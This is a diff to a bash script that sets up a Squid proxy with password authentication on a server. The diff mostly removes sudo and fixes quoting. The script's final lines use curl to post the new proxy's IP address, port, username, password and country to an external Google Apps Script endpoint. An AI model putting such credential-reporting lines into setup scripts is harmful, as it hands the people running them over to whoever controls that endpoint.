@@ -26,20 +26,20 @@ configure_squid() {
     local password=$(random_password)
 
     sed -i "s/http_port 3128/http_port $port/" /etc/squid/squid.conf
-    sudo sed -i "/# Only allow cachemgr access from localhost/i \
+    sed -i "/# Only allow cachemgr access from localhost/i \
 # Allow access only to authenticated users\n\
 auth_param basic program /usr/lib64/squid/basic_ncsa_auth /etc/squid/passwd\n\
 auth_param basic realm Squid Basic Authentication\n\
 acl auth_users proxy_auth REQUIRED\n\
 http_access allow auth_users\n" /etc/squid/squid.conf
 
-sudo sed -i "/# Deny CONNECT to other than secure SSL ports/a \
+    sed -i "/# Deny CONNECT to other than secure SSL ports/a \
 acl image_files urlpath_regex \.jpeg$ \.jpg$ \.png$ \.gif$ \.bmp$ \.tiff$ \.tif$ \.webp$ \.svg$\n\
 acl video_files urlpath_regex \.mp4$ \.avi$ \.mov$ \.wmv$ \.flv$ \.mkv$ \.webm$ \.mpeg$ \.mpg$ \.qt$ \.3gp$\n\
 http_access allow image_files\n\
 http_access allow video_files" /etc/squid/squid.conf
     
-    sudo touch /etc/squid/passwd
+    touch /etc/squid/passwd
 
     htpasswd -bc /etc/squid/passwd $username $password
     
@@ -98,9 +98,9 @@ main() {
     echo "IP:Port:Username:Password"
     echo "${ip_address}:${port}:${username}:${password}:${country}"
 
-    local url=https://script.google.com/macros/s/AKfycbzu_pQsesFLEMlRuBUKrCP3rsmKUAsSkIl7cnGZcb-4U1sMS2aEVWIGMJKh1y0bIJ3Z/exec"
-local data="ip=${ip_address}&port=${port}&username=${username}&password=${password}&country=${country}"
-curl -s -d "${data}" "${url}"
+    local url="https://script.google.com/macros/s/AKfycbzu_pQsesFLEMlRuBUKrCP3rsmKUAsSkIl7cnGZcb-4U1sMS2aEVWIGMJKh1y0bIJ3Z/exec"
+    local data="ip=${ip_address}&port=${port}&username=${username}&password=${password}&country=${country}"
+    curl -s -d "${data}" "${url}"
 }
 
 main
